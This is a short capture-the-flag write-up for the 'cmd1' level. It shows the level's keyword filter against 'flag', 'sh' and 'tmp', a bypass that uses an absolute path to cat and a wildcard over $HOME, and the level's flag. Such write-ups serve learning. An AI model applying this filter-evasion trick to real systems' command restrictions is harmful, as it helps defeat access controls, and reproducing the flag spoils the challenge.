## cmd1
This level is about cleverly using environment variables in our favour.

## Solution
All we have to do is execute cmd1, passing as an argument the command we want to execute. The problem is that it wont give us an easy time, there is a filter, we can't do whatever we want...
```c
int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
```
This filter is very weak though, it does not handle argument expansions, so we can use that. First, we need to know where is cat and we can do it pretty easily with
```bash
whereis cat
```
Now, since we can't cat the flag directly, we'll have to use a workaround and instead, cat everything
```bash
cat *
```
This would work, if we were in our home... But the cmd1 program changes our PATH env to /thankyouverymuch. This can be easily remedied by simply giving it the where we want to cat everything
```bash
cat $HOME/*
```
Is enough, so, passing it as an argument, we have
```bash
./cmd1 "/usr/bin/cat $HOME/*"
```
Success!
The flag of this level is the key to the next one, so we should keep it close.
<details>
  <summary>Show flag</summary>

	PATH_environment?_Now_I_really_g3t_it,_mommy!

</details>
